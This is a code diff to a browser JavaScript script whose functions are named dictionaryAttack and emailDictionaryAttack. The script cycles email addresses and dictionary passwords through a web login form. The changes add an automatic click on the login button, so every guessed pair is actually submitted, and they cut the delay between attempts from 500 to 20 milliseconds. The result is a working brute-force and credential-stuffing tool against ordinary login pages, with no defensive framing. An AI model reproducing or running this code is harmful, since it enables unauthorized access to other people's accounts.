@@ -28,11 +28,18 @@ function dictionaryAttack() {
     }
 }
 
-function emailDictionaryAttack(i, j) {
+
+
+
+
+
+function emailDictionaryAttack(i, j) { // i = 0; j = 0
     console.log('Testing', emails[i], dictionary[j]);
     password.type = 'text';
     username.value = emails[i];
     password.value = dictionary[j];
+    loginButton.click();
+
     j++;
 
     if (j >= dictionary.length) {
@@ -41,9 +48,16 @@ function emailDictionaryAttack(i, j) {
     }
 
     if (i < emails.length || j < dictionary.length) {
-        setTimeout(emailDictionaryAttack, 500, i, j);
+        setTimeout(emailDictionaryAttack, 20, i, j);
     }
 }
+
+
+
+
+
+
+
 
 let alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
 
